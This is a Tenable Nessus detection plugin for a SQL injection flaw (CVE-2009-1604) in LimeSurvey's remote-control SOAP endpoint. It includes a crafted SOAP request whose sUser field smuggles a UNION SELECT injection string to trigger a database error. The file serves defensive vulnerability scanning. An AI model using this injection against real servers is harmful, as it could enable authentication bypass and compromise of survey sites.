#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(38694);
  script_version("$Revision: 1.13 $");
  script_cvs_date("$Date: 2015/09/24 21:17:11 $");

  script_cve_id("CVE-2009-1604");
  script_bugtraq_id(34785);
  script_osvdb_id(54396);
  script_xref(name:"Secunia", value:"34946");

  script_name(english:"LimeSurvey sUser Parameter SQL Injection");
  script_summary(english:"Tries to generate a SQL syntax error");

  script_set_attribute( attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack."  );
  script_set_attribute( attribute:"description", value:
"The remote host is running LimeSurvey, an open source tool for online
surveys.

The version of LimeSurvey installed on the remote host fails to
sanitize user-supplied input passed to the 'sUser' argument in the
'checkUser()' method of the 'LsrcHelper' class in
'admin/remotecontrol/lsrc.helper.php' before using it to construct
database queries.  Regardless of PHP's 'magic_quotes_gpc' setting, an
unauthenticated attacker can exploit this issue to manipulate database
queries to, for example, bypass authentication and gain administrative
access, which in turn could allow for arbitrary code execution."  );
   # http://limesurvey.svn.sourceforge.net/viewvc/limesurvey?revision=6740&view=revision
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.nessus.org/u?12f68001"
  );
   # http://web.archive.org/web/20090501105016/http://www.limesurvey.org/content/view/169/1/lang,en/
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.nessus.org/u?970f06dc"
  );
  script_set_attribute( attribute:"solution",  value:
"Either upgrade to LimeSurvey 1.82 or later, or remove the application's
'admin/remotecontrol' directory."  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_set_attribute(attribute:"plugin_publication_date", value: "2009/05/06");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:limesurvey:limesurvey");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


iVid = -123;
sPass = "nessus";
sUser = string(
  SCRIPT_NAME, "-", unixtime(), "' UNION SELECT NESSUS -- "
);

postdata = string(
  '<?xml version="1.0" encoding="UTF-8"?>\n',
  '<SOAP-ENV:Envelope \n',
  '    xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" \n',
  '    xmlns:ns1="urn:lsrcNamespace" \n',
  '    xmlns:xsd="http://www.w3.org/2001/XMLSchema" \n',
  '    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" \n',
  '    xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" \n',
  '    SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\n',
  '  <SOAP-ENV:Body>\n',
  '    <ns1:sActivateSurvey>\n',
  '      <sUser xsi:type="xsd:string">', sUser, '</sUser>\n',
  '      <sPass xsi:type="xsd:string">', sPass, '</sPass>\n',
  '      <iVid xsi:type="xsd:int">', iVid, '</iVid>\n',
  '      <dStart xsi:type="xsd:date"></dStart>\n',
  '      <dEnd xsi:type="xsd:date"></dEnd>\n',
  '    </ns1:sActivateSurvey>\n',
  '  </SOAP-ENV:Body>\n',
  '</SOAP-ENV:Envelope>'
);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/limesurvey", "/survey", "/surveys", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  url = string(dir, "/admin/remotecontrol/lsrc.server.php");

  # Make sure the affected script exists.
  #
  # nb: a GET request for the URL itself won't return anything, but
  #     appending "?wsdl" will return the current WSDL file.
  res = http_send_recv3(method:"GET", item:string(url, "?wsdl"), port:port);
  if (isnull(res)) exit(0);

  if (
    'filename=lsrc.wsdl' >< res[1] ||
    "urn:lsrcNamespace" >< res[2]
  )
  {
    # Try to exploit the issue.
    req = http_mk_post_req(
      port        : port,
      item        : url, 
      data        : postdata,
      add_headers : make_array(
        "Content-Type", "text/xml; charset=utf-8",
        "SOAPAction", '"urn:lsrcNamespaceAction"'
      )
    );
    res = http_send_recv_req(port:port, req:req);
    if (isnull(res)) exit(0);

    # There's a problem if we see a syntax error.
    if (
      "Unknown column 'NESSUS' " >< res[2] ||
      string("WHERE users_name='", sUser, "'") >< res[2]
    )
    {
      if (report_verbosity > 0)
      {
        req_str = http_mk_buffer_from_req(req:req);

        report = string(
          "\n",
          "Nessus was able to verify the vulnerability exists using the following\n",
          "request :\n",
          "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
          req_str, "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
        );
        security_hole(port:port, extra:report);
      }
      else security_hole(port);

      set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);
      exit(0);
    }
  }
}
